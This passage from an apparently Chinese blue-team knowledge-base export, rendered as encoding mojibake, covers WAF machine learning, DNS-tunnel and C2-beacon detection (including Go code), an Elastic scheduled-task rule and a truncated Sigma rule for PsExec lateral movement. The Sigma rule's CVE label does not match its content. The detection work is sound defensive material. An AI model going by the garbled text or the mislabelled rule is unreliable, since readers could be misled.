c@master/uPic/2023-01/tVmqXg.jpg)\r\n\r\n# 4. å·¥ä½œåŸç†\r\n\r\nåŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹è¡¥å……äº†ç°æœ‰çš„æ‰˜ç®¡è§„åˆ™é›†ï¼Œä¾‹å¦‚ OWASP å’Œ Cloudflare æ‰˜ç®¡è§„åˆ™ã€‚è¿™å¥—ç³»ç»ŸåŸºäºæ—¨åœ¨æ²¡æœ‰ç ”ç©¶äººå‘˜æˆ–æœ€ç»ˆç”¨æˆ·ç›´æ¥ç›‘ç£çš„æƒ…å†µä¸‹è¯†åˆ«æ”»å‡»æ¨¡å¼å˜ä½“æˆ–å¼‚å¸¸çš„æ¨¡å‹ã€‚\r\n\r\næˆªè‡³ä»Šæ—¥ï¼ŒCloudflareå·²ç»å…¬å¼€ä¸¤ç§æ”»å‡»æ‰‹æ®µçš„åˆ†æ•°ï¼šSQL æ³¨å…¥ï¼ˆSQLiï¼‰å’Œè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰ã€‚ç”¨æˆ·èƒ½æ ¹æ®ä¸‰ä¸ªå•ç‹¬çš„åˆ†æ•°æ¥åˆ›å»ºè‡ªå®šä¹‰ WAF/é˜²ç«å¢™è§„åˆ™ï¼šæ€»åˆ† ï¼ˆ`cf.waf.ml.score`ï¼‰ï¼ŒSQLi åˆ†æ•°å’Œ XSS åˆ†æ•°ï¼ˆåˆ†åˆ«ä¸ºÂ `cf.waf.ml.score.sqli`ï¼Œ`cf.waf.ml.score.xss`,ï¼‰ã€‚è¿™äº›åˆ†æ•°ä»‹äº 1-99ï¼Œå…¶ä¸­ 1 ä¸ºç»å¯¹æ¶æ„ï¼Œ99 ä»£è¡¨æœ‰æ•ˆæµé‡ã€‚\r\n\r\n![CSU2ZS](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/CSU2ZS.jpg)\r\n\r\nç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ç°æœ‰ WAF è§„åˆ™åˆ†ç±»çš„æµé‡å¯¹è¯¥æ¨¡å‹è¿›è¡Œè®­ç»ƒï¼Œå®ƒå¯¹åŸå§‹è¯·æ±‚çš„ä¸€ä¸ªå˜å¼‚ç‰ˆæœ¬æœ‰æ•ˆï¼Œä½¿å…¶æ›´å®¹æ˜“è¯†åˆ«æ”»å‡»çš„æŒ‡çº¹ã€‚\r\n\r\nå¯¹äºæ¯ä¸ªè¯·æ±‚ï¼Œè¯¥æ¨¡å‹å¯¹è¯·æ±‚çš„æ¯ä¸ªéƒ¨åˆ†ç‹¬ç«‹è¯„åˆ†ï¼Œä»è€Œæœ‰å¯èƒ½è¯†åˆ«æ¶æ„è´Ÿè½½æ‰€åœ¨çš„ä½ç½®ï¼Œä¾‹å¦‚ï¼Œåœ¨è¯·æ±‚çš„æ­£æ–‡ã€URI æˆ–æ ‡å¤´ä¸­ã€‚\r\n\r\n![EZsUM7](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/EZsUM7.jpg)\r\n\r\nè¿™çœ‹èµ·æ¥å¾ˆç®€å•ï¼Œä½† Cloudflare çš„å·¥ç¨‹å¸ˆéœ€è¦è§£å†³ä¸€ç³»åˆ—æŒ‘æˆ˜æ‰èƒ½åšåˆ°ã€‚å…¶ä¸­åŒ…æ‹¬ï¼šå¦‚ä½•å»ºç«‹ä¸€ä¸ªå¯é çš„æ•°æ®é›†ï¼Œå¯æ‰©å±•çš„æ•°æ®æ ‡ç­¾ï¼Œé€‰æ‹©æ­£ç¡®çš„æ¨¡å‹æ¶æ„ï¼Œä»¥åŠè¦æ±‚å¯¹ Cloudflare å…¨çƒç½‘ç»œå¤„ç†çš„æ¯ä¸€ä¸ªè¯·æ±‚ï¼ˆæ¯ç§’ 3200 ä¸‡ä¸ªï¼‰æ‰§è¡Œåˆ†ç±»ã€‚\r\n\r\n# 5. å‚è€ƒèµ„æ–™\r\n- [é€šè¿‡æœºå™¨å­¦ä¹ æ”¹å–„ WAF (cloudflare.com)](https://blog.cloudflare.com/zh-cn/waf-ml-zh-cn/)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/ç³»ç»Ÿè®¾è®¡/ç³»ç»Ÿè®¾è®¡åŸºç¡€çŸ¥è¯†/","title":"ç³»ç»Ÿè®¾è®¡åŸºç¡€çŸ¥è¯†"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: ç³»ç»Ÿè®¾è®¡åŸºç¡€çŸ¥è¯†\r\ntags:\r\n- Blue TeamåŸºç¡€è®¾æ–½\r\n- ç³»ç»Ÿè®¾è®¡\r\n- å®‰å…¨æ¶æ„\r\n---\r\n\r\né€‰æ‹©æ­£ç¡®çš„æ¶æ„ = é€‰æ‹©æ­£ç¡®çš„æˆ˜æ–— + ç®¡ç†æƒè¡¡\r\n\r\n# ç¬¬ä¸€æ­¥ï¼šæè¿°ä½¿ç”¨åœºæ™¯ï¼Œçº¦æŸå’Œå‡è®¾\r\næŠŠæ‰€æœ‰éœ€è¦çš„ä¸œè¥¿èšé›†åœ¨ä¸€èµ·ï¼Œå®¡è§†é—®é¢˜ã€‚ä¸åœçš„æé—®ï¼Œä»¥è‡³äºæˆ‘ä»¬å¯ä»¥æ˜ç¡®ä½¿ç”¨åœºæ™¯å’Œçº¦æŸã€‚è®¨è®ºå‡è®¾ã€‚\r\n\r\n- è°ä¼šä½¿ç”¨å®ƒï¼Ÿ\r\n- ä»–ä»¬ä¼šæ€æ ·ä½¿ç”¨å®ƒï¼Ÿ\r\n- æœ‰å¤šå°‘ç”¨æˆ·ï¼Ÿ\r\n- ç³»ç»Ÿçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ\r\n- ç³»ç»Ÿçš„è¾“å…¥è¾“å‡ºåˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ\r\n- æˆ‘ä»¬å¸Œæœ›å¤„ç†å¤šå°‘æ•°æ®ï¼Ÿ\r\n- æˆ‘ä»¬å¸Œæœ›æ¯ç§’é’Ÿå¤„ç†å¤šå°‘è¯·æ±‚ï¼Ÿ\r\n- æˆ‘ä»¬å¸Œæœ›çš„è¯»å†™æ¯”ç‡ï¼Ÿ\r\n\r\n# ç¬¬äºŒæ­¥ï¼šåˆ›é€ ä¸€ä¸ªé«˜å±‚çº§çš„è®¾è®¡\r\nä½¿ç”¨æ‰€æœ‰é‡è¦çš„ç»„ä»¶æ¥æç»˜å‡ºä¸€ä¸ªé«˜å±‚çº§çš„è®¾è®¡ã€‚\r\n\r\n- ç”»å‡ºä¸»è¦çš„ç»„ä»¶å’Œè¿æ¥\r\n- è¯æ˜ä½ çš„æƒ³æ³•\r\n\r\n# ç¬¬ä¸‰æ­¥ï¼šè®¾è®¡æ ¸å¿ƒç»„ä»¶\r\nå¯¹æ¯ä¸€ä¸ªæ ¸å¿ƒç»„ä»¶è¿›è¡Œè¯¦ç»†æ·±å…¥çš„åˆ†æã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ è¢«é—®åˆ°[è®¾è®¡ä¸€ä¸ª url ç¼©å†™æœåŠ¡](https://github.com/donnemartin/system-design-primer/blob/master/solutions/system_design/pastebin/README.md)ï¼Œå¼€å§‹è®¨è®ºï¼š\r\n\r\nç”Ÿæˆå¹¶å‚¨å­˜ä¸€ä¸ªå®Œæ•´ url çš„ hash\r\n\r\n- MD5 å’Œ Base62\r\n- Hash ç¢°æ’\r\n- SQL è¿˜æ˜¯ NoSQL\r\n- æ•°æ®åº“æ¨¡å‹\r\n\r\nå°†ä¸€ä¸ª hashed url ç¿»è¯‘æˆå®Œæ•´çš„ url\r\n- æ•°æ®åº“æŸ¥æ‰¾\r\nAPI å’Œé¢å‘å¯¹è±¡è®¾è®¡\r\n\r\n# ç¬¬å››æ­¥ï¼šæ‰©å±•è®¾è®¡\r\nç¡®è®¤å’Œå¤„ç†ç“¶é¢ˆä»¥åŠä¸€äº›é™åˆ¶ã€‚ä¸¾ä¾‹æ¥è¯´å°±æ˜¯ä½ éœ€è¦ä¸‹é¢çš„è¿™äº›æ¥å®Œæˆæ‰©å±•æ€§çš„è®®é¢˜å—ï¼Ÿ\r\n- è´Ÿè½½å‡è¡¡\r\n- æ°´å¹³æ‰©å±•\r\n- ç¼“å­˜\r\n- æ•°æ®åº“åˆ†ç‰‡\r\n- è®ºè¿°å¯èƒ½çš„è§£å†³åŠæ³•å’Œä»£ä»·ã€‚æ¯ä»¶äº‹æƒ…éœ€è¦å–èˆã€‚å¯ä»¥ä½¿ç”¨[å¯æ‰©å±•ç³»ç»Ÿçš„è®¾è®¡åŸåˆ™](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E4%B8%BB%E9%A2%98%E7%9A%84%E7%B4%A2%E5%BC%95)æ¥å¤„ç†ç“¶é¢ˆã€‚\r\n\r\n# ç¬¬äº”æ­¥ï¼šé¢„ä¼°è®¡ç®—é‡\r\nä½ æˆ–è®¸ä¼šè¢«è¦æ±‚é€šè¿‡æ‰‹ç®—è¿›è¡Œä¸€äº›ä¼°ç®—ã€‚[é™„å½•](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#%E9%99%84%E5%BD%95)æ¶‰åŠåˆ°çš„æ˜¯ä¸‹é¢çš„è¿™äº›èµ„æºï¼š\r\n- [ä½¿ç”¨é¢„ä¼°è®¡ç®—é‡](http://highscalability.com/blog/2011/1/26/google-pro-tip-use-back-of-the-envelope-calculations-to-choo.html)\r\n- [2 çš„æ¬¡æ–¹è¡¨](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#2-%E7%9A%84%E6%AC%A1%E6%96%B9%E8%A1%A8)\r\n- [æ¯ä¸ªç¨‹åºå‘˜éƒ½åº”è¯¥çŸ¥é“çš„å»¶è¿Ÿæ•°](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84%E5%BB%B6%E8%BF%9F%E6%95%B0)\r\n\r\n# ç›¸å…³èµ„æºå’Œå»¶ä¼¸é˜…è¯»\r\n- [æ€æ ·é€šè¿‡ä¸€ä¸ªç³»ç»Ÿè®¾è®¡çš„é¢è¯•](https://www.palantir.com/2011/10/how-to-rock-a-systems-design-interview/)\r\n- [ç³»ç»Ÿè®¾è®¡çš„é¢è¯•](http://www.hiredintech.com/system-design)\r\n- [ç³»ç»Ÿæ¶æ„ä¸è®¾è®¡çš„é¢è¯•ç®€ä»‹](https://www.youtube.com/watch?v=ZgdS0EUmn70)\r\n- [https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/å‘½ä»¤ä¸æ§åˆ¶ C2/DNS Tunneléš§é“æ£€æµ‹/","title":"DNS Tunneléš§é“æ£€æµ‹"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: DNS Tunneléš§é“æ£€æµ‹\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- å‘½ä»¤ä¸æ§åˆ¶ C2\r\n- DNS\r\n---\r\n\r\n# 1. é˜…è¯»ç›®å½•(Content)\r\n- DNSéš§é“ç®€ä»‹\r\n  - DNSéš§é“æœ¨é©¬åˆ†ç±»\r\n    - IPç›´è¿å‹ DNSéš§é“æœ¨é©¬\r\n    - åŸŸåå‹ DNSéš§é“æœ¨é©¬ - DNSè¿­ä»£æŸ¥è¯¢ä¸­ç»§éš§é“\r\n    - IPç›´è¿å‹å’ŒåŸŸåè§£æå‹å¼‚åŒç‚¹\r\n- Powershell+dnscat2å®ç°DNSéšè”½éš§é“åå¼¹Shell\r\n  - C&CåŸŸåç»‘å®š\r\n  - åœ¨C&CæœåŠ¡å™¨ä¸Šå®‰è£…DNS C&C Server\r\n  - éƒ¨ç½²å®¢æˆ·ç«¯dnscat2 client\r\n  - è¿æ¥å»ºç«‹åï¼ŒC&Cæ§åˆ¶ç«¯å¯ä»¥æ‰§è¡ŒæŒ‡ä»¤\r\n    - è·å–shell\r\n    - ç«¯å£è½¬å‘\r\n  - wiresharkæŠ“åŒ…åˆ†æ\r\n    - UDPç›´è¿æ¨¡å¼\r\n    - åŸŸåè§£ææ¨¡å‹\r\n- å¯ç”¨äºDNS tunnelçš„æ£€æµ‹æ€è·¯ - åŸºäºUDP DNSä¼šè¯\r\n  - DNS query typeæˆåˆ†ç»„æˆå¼‚å¸¸æ£€æµ‹\r\n    - DNS Tunnel\r\n    - DNS FF Botnet\r\n    - DNS Query types Numbers\r\n  - åŸºäºZipfå®šå¾‹çš„å¼‚å¸¸æ£€æµ‹ - Frequency Analysis\r\n  - DNS query/answeræ–‡æœ¬ç‰¹å¾\r\n    - n-gramæ–‡æœ¬ç‰¹å¾\r\n    - åŸºäºCNNæ·±åº¦ç¥ç»ç½‘ç»œï¼Œä»æ–‡æœ¬è§’åº¦åˆ¤æ–­å•æ¡DNS queryæ˜¯å¦å­˜åœ¨å¯ç–‘Tunnelç‰¹å¾\r\n    - Query/Answeré•¿åº¦ç‰¹å¾\r\n  - åŸºäºä¼šè¯èšç±»ç»´åº¦çš„DNS tunnelè¡Œä¸ºç‰¹å¾\r\n    - DNSä¼šè¯æ—¶é•¿\r\n    - DNSä¼šè¯ä¸­æ•°æ®åŒ…æ€»æ•°\r\n    - â€œä¸Šè¡Œå¤§åŒ…â€å è¯·æ±‚æŠ¥æ–‡æ€»æ•°çš„æ¯”ä¾‹\r\n    - â€œä¸‹è¡Œå°åŒ…â€å å“åº”æŠ¥æ€»æ•°çš„æ¯”ä¾‹\r\n    - æœ‰æ•ˆè½½è·çš„ä¸Šä¼ ä¸‹è½½æ¯”\r\n    - æœ‰æ•ˆè½½è·éƒ¨åˆ†æ˜¯å¦åŠ å¯†\r\n    - åŸŸåå¯¹åº”çš„ä¸»æœºåæ•°é‡\r\n    - FQDNæ•°å¼‚å¸¸æ£€æµ‹\r\n    - æ€»çš„query æŠ¥æ–‡Payloadè½½è·é‡\r\n  - å“åº”æ—¶é—´ç›¸å…³ç‰¹å¾\r\n    - Response wait timeç‰¹å¾\r\n  - ä¿¡æ¯ç†µ\r\n  - å‘åŒ…é¢‘ç‡è¡Œä¸º\r\n- å¯ç”¨äºDNS tunnelçš„æ£€æµ‹æ€è·¯ - åŸºäºDNS QUERYç»´åº¦\r\n  - Network Features - ç½‘ç»œè®¿é—®è¡Œä¸ºæ–¹é¢çš„ç‰¹å¾\r\n    - åŸŸåè¢«è®¿é—®é¢‘ç‡è§’åº¦ç‰¹å¾\r\n    - TTL (last seen - first seen)\r\n    - window\r\n    - dns name change frequency\r\n  - Lexical Features\r\n    - åŸŸåæœ¬èº«è¯é¢‘ç‰¹å¾å±‚é¢ç‰¹å¾\r\n    - åŸŸåçš„é¦™ä¾¬ç†µ\r\n    - å­—ç¬¦åˆ†å¸ƒç‰¹å¾ -å¯è¯»æ€§/æ˜“è¯»æ€§æ–¹é¢çš„ä½“ç°\r\n  - DNS sessionä¼šè¯ç›¸å…³ç‰¹å¾\r\n    - Number of IP subnetworks\r\n    - DNSå¯¹åº”çš„src_ip/dst_ip countç›¸å…³ç‰¹å¾\r\n    - DNS query typeç»„æˆæˆåˆ†ç›¸å…³ç‰¹å¾\r\n  - DNSåŸŸåç›¸å…³metaä¿¡æ¯\r\n    - whois-based features\r\n- å¼‚å¸¸æ•°æ®æ¸…æ´—\r\n  - åŸºçº¿å¼‚å¸¸è¿‡æ»¤æ€è·¯\r\n  - æ— ç›‘ç£å¼‚å¸¸abnormalæ£€æµ‹ç®—æ³•\r\n\r\n# 2. å‚è€ƒèµ„æ–™\r\n- [https://www.cnblogs.com/LittleHann/p/8656621.html](https://www.cnblogs.com/LittleHann/p/8656621.html)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/å‘½ä»¤ä¸æ§åˆ¶ C2/åŸºäºç»Ÿè®¡å­¦çš„C2æµé‡æ£€æµ‹/","title":"åŸºäºç»Ÿè®¡å­¦çš„C2æµé‡æ£€æµ‹"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: åŸºäºç»Ÿè®¡å­¦çš„C2æµé‡æ£€æµ‹\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- å‘½ä»¤ä¸æ§åˆ¶ C2\r\n- æµé‡æ£€æµ‹\r\n---\r\n\r\n# 1. åŸºç¡€ç»Ÿè®¡å­¦çŸ¥è¯†\r\n- ä¸­ä½æ•°\r\n  - ä¸­ä½æ•°æ˜¯æƒ³è¦è¡¨ç¤ºä¸€ä¸ªæ•°æ®é›†ä¸­é—´ä½ç½®çš„æ•°æ®ã€‚\r\n    - `æ¯”å¦‚ä¸€ç»„æ•°å­— (1, 1, 2, 2, 4, 6, 9) çš„ä¸­ä½æ•°ä¸º 2`\r\n\r\n- ç»å¯¹ä¸­ä½å·®\r\n  - ä¸­ä½æ•°æ˜¯æƒ³è¦è¡¨ç¤ºä¸€ä¸ªæ•°æ®é›†ä¸­é—´ä½ç½®çš„æ•°æ®ï¼Œé‚£ä¹ˆæ¯ä¸ªæ•°æ®ä¸ä¸­ä½æ•°çš„å·®å€¼ï¼Œåæ˜ äº†è¿™äº›æ•°æ®åç¦»ä¸­é—´ä½ç½®çš„ç¨‹åº¦ï¼Œåœ¨è¿™ä¸ªåç¦»ç¨‹åº¦ä¸­å–ä¸­ä½æ•°å¾—åˆ°çš„å°±æ˜¯ç»å¯¹ä¸­ä½å·®ã€‚\r\n\r\n    ```\r\n      æ¯”å¦‚ä¸€ç»„æ•°å­— (1, 1, 2, 2, 4, 6, 9) çš„ä¸­ä½æ•°ä¸º 2\r\n      è¿™ç»„æ•°å­—ç›¸å¯¹äº2çš„åå·®ä¸ºï¼š(1, 1, 0, 0, 2, 4, 7)ï¼Œä¸­ä½æ•°ä¸º 1\r\n      æ‰€ä»¥ç»å¯¹ä¸­ä½å·®ä¸º 1\r\n    ```\r\n\r\n- ååº¦\r\n  - è¡¡é‡éšæœºå˜é‡æ¦‚ç‡åˆ†å¸ƒçš„ä¸å¯¹ç§°æ€§ï¼Œæ˜¯ç›¸å¯¹äºå¹³å‡å€¼ä¸å¯¹ç§°ç¨‹åº¦çš„åº¦é‡ï¼Œé€šè¿‡å¯¹ååº¦ç³»æ•°çš„æµ‹é‡ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåˆ¤å®šæ•°æ®åˆ†å¸ƒçš„ä¸å¯¹ç§°ç¨‹åº¦ä»¥åŠæ–¹å‘ã€‚\r\n  - ![fv5E4Y](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/fv5E4Y.jpg)\r\n  - ååº¦çš„è¡¡é‡æ˜¯ç›¸å¯¹äºæ­£æ€åˆ†å¸ƒæ¥è¯´ï¼Œæ­£æ€åˆ†å¸ƒçš„ååº¦ä¸º0ï¼Œå³è‹¥æ•°æ®åˆ†å¸ƒæ˜¯å¯¹ç§°çš„ï¼Œååº¦ä¸º0ã€‚è‹¥ååº¦å¤§äº0ï¼Œåˆ™åˆ†å¸ƒå³åï¼ˆæ­£ååº¦ï¼‰ï¼Œå³åˆ†å¸ƒæœ‰ä¸€æ¡é•¿å°¾åœ¨å³ï¼›è‹¥ååº¦å°äº0ï¼Œåˆ™åˆ†å¸ƒä¸ºå·¦åï¼ˆè´Ÿååº¦ï¼‰ï¼Œå³åˆ†å¸ƒæœ‰ä¸€æ¡é•¿å°¾åœ¨å·¦ï¼ˆå¦‚ä¸Šå›¾ï¼‰ï¼›åŒæ—¶ååº¦çš„ç»å¯¹å€¼è¶Šå¤§ï¼Œè¯´æ˜åˆ†å¸ƒçš„åç§»ç¨‹åº¦è¶Šä¸¥é‡ã€‚\r\n\r\n# 2. C2æµé‡vsæ­£å¸¸æµé‡\r\nå‡è®¾beaconçš„é…ç½®ä¸ºï¼š\r\n| Sleepæ—¶é—´ | jitter | å®é™…sleepæ—¶é—´ |\r\n| --------- | ------ | ------------- |\r\n| 300s      | 20%    | 240s~360s     |\r\n\r\n\t- è®¿é—®çš„æ—¶é—´é—´éš”ä¸º240s-360s\r\n\r\nå‡è®¾æ­£å¸¸ç”¨æˆ·éšæœºæµè§ˆç›¸åŒç½‘é¡µ\r\n- è®¿é—®çš„æ—¶é—´é—´éš”ä¸º60s-600s\r\n- åŸºäºä¸Šè¿°çš„å‡è®¾å’Œç»Ÿè®¡å­¦çŸ¥è¯†ï¼Œå¯ä»¥ç”»å‡ºå›¾ï¼š\r\n  - ![gQKyp4](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/gQKyp4.jpg)\r\n- beaconä¸­ä½æ•°ï¼ˆMedianï¼‰: 319\r\n- æ­£å¸¸ç”¨æˆ·ä¸­ä½æ•°ï¼ˆMedianï¼‰: 236\r\n- beaconç»å¯¹ä¸­ä½å·®ï¼ˆMADï¼‰: 21\r\n- æ­£å¸¸ç”¨æˆ·ç»å¯¹ä¸­ä½å·®ï¼ˆMADï¼‰: 95\r\n\r\nå¯ä»¥å¾—å‡ºç»“è®ºï¼š\r\n- **beaconï¼šåæ­£æ€åˆ†å¸ƒï¼Œç»å¯¹ä¸­ä½å·®æ¯”è¾ƒå°**\r\n- **æ­£å¸¸ç”¨æˆ·ï¼šåæ­£/è´Ÿååº¦åˆ†å¸ƒï¼Œç»å¯¹ä¸­ä½å·®æ¯”è¾ƒå¤§**\r\n\r\nå‚è€ƒRITA (Real Intelligence Threat Analytics)çš„ç®—æ³•ï¼Œé€šè¿‡è¯·æ±‚çš„æ—¶é—´é—´éš”å’Œæ•°æ®åŒ…å¤§å°çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œå¾—å‡ºå¯ç–‘çš„C2çš„è¯·æ±‚:\r\n- ååº¦\r\n- ç»å¯¹ä¸­ä½å·®\r\n- é¢‘ç‡\r\n\r\nå®ç°çš„ä»£ç ç‰‡æ®µå¦‚ä¸‹\r\n\r\n```go\r\n//è®¡ç®—ååº¦\r\n//store the diff slice length\r\ndiffLength := len(diff)\r\n\r\n//diffLength-1 is used since diff is a zero based slice\r\ntsLow := diff[util.Round(.25*float64(diffLength-1))]\r\ntsMid := diff[util.Round(.5*float64(diffLength-1))]\r\ntsHigh := diff[util.Round(.75*float64(diffLength-1))]\r\ntsBowleyNum := tsLow + tsHigh - 2*tsMid\r\ntsBowleyDen := tsHigh - tsLow\r\n\r\n//tsSkew should equal zero if the denominator equals zero\r\n//bowley skew is unreliable if Q2 = Q1 or Q2 = Q3\r\nif tsBowleyDen != 0 && tsMid != tsLow && tsMid != tsHigh {\r\n\ttsSkew = float64(tsBowleyNum) / float64(tsBowleyDen)\r\n}\r\n\r\n//è®¡ç®—ç»å¯¹ä¸­ä½å·®\r\ntsMadm := devs[util.Round(.5*float64(diffLength-1))]\r\n\r\n//è®¡ç®—é¢‘ç‡\r\nbucketDivs, freqList, freqCount, histScore := getTsHistogramScore(a.tsMin, a.tsMax, res.TsList)\r\n```\r\n\r\n# 3. å‚è€ƒèµ„æ–™\r\n- [https://infosecjupyterthon.com/2021/sessions/day2-5-C2_Beaconing_Detection_using_Statistical_Analysis.html](https://infosecjupyterthon.com/2021/sessions/day2-5-C2_Beaconing_Detection_using_Statistical_Analysis.html)\r\n- [https://github.com/activecm/rita](https://github.com/activecm/rita)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/å¨èƒæ£€æµ‹è§„åˆ™/Elastic Rules/","title":"Elastic Rules"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Elastic Rules\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- å¨èƒæ£€æµ‹è§„åˆ™\r\n- Elastic\r\n---\r\n\r\n# 1. ä»‹ç»\r\nå†…ç½®100+æ£€æµ‹è§„åˆ™å¯ç›´æ¥ä½¿ç”¨ï¼Œå¦‚ä¸‹å›¾ï¼š\r\n![nDBkDF](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/nDBkDF.jpg)\r\n\r\n\r\n# 2. æ¡ˆä¾‹\r\næ£€æµ‹è®¡åˆ’ä»»åŠ¡ï¼ˆscheduled taskï¼‰æ˜¯å¦è¢«åˆ›å»º\r\n\r\n- **Rule type**ï¼šEQL\r\n- **Rule indices**:\r\n  - winlogbeat-*\r\n  - logs-system.*\r\n- **Severity**ï¼šLow\r\n- **Risk score**ï¼š21\r\n- **Runs every**ï¼š5 min\r\n- **Searches indices from**ï¼šnow-9m\r\n- **Maximum alerts per execution**ï¼š100\r\n- **References**ï¼šhttps://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698\r\n- **Potential false positives**ï¼šå®‰è£…æ–°è½¯ä»¶æ—¶ï¼Œä¹Ÿå¯èƒ½è§¦å‘åˆ›å»ºåˆæ³•çš„è®¡åˆ’ä»»åŠ¡\r\n- è§„åˆ™ï¼š\r\n\r\n```\r\niam where event.action == \"scheduled-task-created\" and /* excluding \r\ntasks created by the computer account */ not user.name : \"*$\" and\r\n/* TaskContent is not parsed, exclude by full taskname noisy ones */\r\nnot winlog.event_data.TaskName : (\"\\\\OneDrive Standalone\r\nUpdate Task-S-1-5-21*\", \"\\\\Hewlett-Packard\\\\HP Web\r\nProducts Detection\", \"\\\\Hewlett-Packard\\\\HPDeviceCheck\")\r\n```\r\n\r\n- **Framework**: MITRE ATT&CKTM\r\n  - Tactic:\r\n    - Name: Persistence\r\n    - ID: TA0003\r\n    - Reference URL: [https://attack.mitre.org/tactics/TA0003/](https://attack.mitre.org/tactics/TA0003/)\r\n  - Technique:\r\n    - Name: Scheduled Task/Job\r\n    - ID: T1053\r\n    - Reference URL: [https://attack.mitre.org/techniques/T1053/](https://attack.mitre.org/techniques/T1053/)\r\n\r\n# 3. å‚è€ƒèµ„æ–™\r\n- [https://www.elastic.co/guide/en/security/current/prebuilt-rules.html](https://www.elastic.co/guide/en/security/current/prebuilt-rules.html)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/å¨èƒæ£€æµ‹è§„åˆ™/SIGMA Rules/","title":"SIGMA Rules"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: SIGMA Rules\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- å¨èƒæ£€æµ‹è§„åˆ™\r\n- SIGMA\r\n---\r\n\r\n# 1. ä»‹ç»\r\nä¸€ç§é€šç”¨ä¸”å¼€æ”¾çš„åŸºäºç­¾åçš„è§„åˆ™æ ¼å¼ï¼Œå¯ä»¥ç›´æ¥æè¿°ç›¸å…³çš„æ—¥å¿—äº‹ä»¶ã€‚è§„åˆ™æ ¼å¼éå¸¸çµæ´»ï¼Œæ˜“äºç¼–å†™ï¼Œé€‚ç”¨äºä»»ä½•ç±»å‹çš„æ—¥å¿—æ–‡ä»¶ã€‚ä¸»è¦ç›®çš„æ˜¯æä¾›ä¸€ç§ç»“æ„åŒ–çš„å½¢å¼ï¼Œç ”ç©¶äººå‘˜æˆ–åˆ†æäººå‘˜å¯ä»¥åœ¨å…¶ä¸­æè¿°ä»–ä»¬æ›¾ç»å¼€å‘çš„æ£€æµ‹æ–¹æ³•ï¼Œå¹¶ä½¿å…¶ä¸ä»–äººå…±äº«ã€‚\r\n\r\nSigmaæ”¯æŒä¸»æµçš„SIEMå·¥å…·ã€‚å®ƒæœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š\r\n\r\n- å®ƒä½¿åˆ†æèƒ½å¤Ÿåœ¨ç»„ç»‡ä¹‹é—´é‡å¤ä½¿ç”¨å’Œå…±äº«ã€‚\r\n- é«˜çº§é€šç”¨åˆ†æè¯­è¨€\r\n- è§£å†³è®°å½•ç­¾åé—®é¢˜ç­‰æœ€å¯é çš„æ–¹æ³•\r\n- çº¯æ–‡æœ¬YAMLæ–‡ä»¶\r\n\r\n# 2. ç›¸å…³Presentation\r\n[https://github.com/Neo23x0/Talks/blob/master/Sigma_Hall_of_Fame_20211022.pdf](https://github.com/Neo23x0/Talks/blob/master/Sigma_Hall_of_Fame_20211022.pdf)\r\n\r\n# 3. ä¸¾ä¾‹ï¼šCVE-2009-3898çš„Sigmaè§„åˆ™\r\n```\r\n  title: Suspicious PsExec Execution\r\n  id: c462f537-a1e3-41a6-b5fc-b2c2cef9bf82\r\n  description: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker\r\n      uses a different psexec client other than sysinternal one\r\n  author: Samir Bousseaden\r\n  date: 2019/04/03\r\n  references:\r\n      - https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html\r\n  tags:\r\n      - attack.lateral_movement\r\n      - attack.t1077\r\n  logsource:\r\n      product: windows\r\n      service: security\r\n      description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\r\n  detection:\r\n      selection1:\r\n          EventID: 5145\r\n          ShareName: \\\\*\\IPC$\r\n          RelativeTargetName:\r\n           - '*-stdin'\r\n           - '*-stdout'\r\n           - '*-stderr'\r\n      selection2:\r\n          EventID: 5145\r\n          ShareName: \\\\*\\IPC$\r\n          RelativeTargetName: 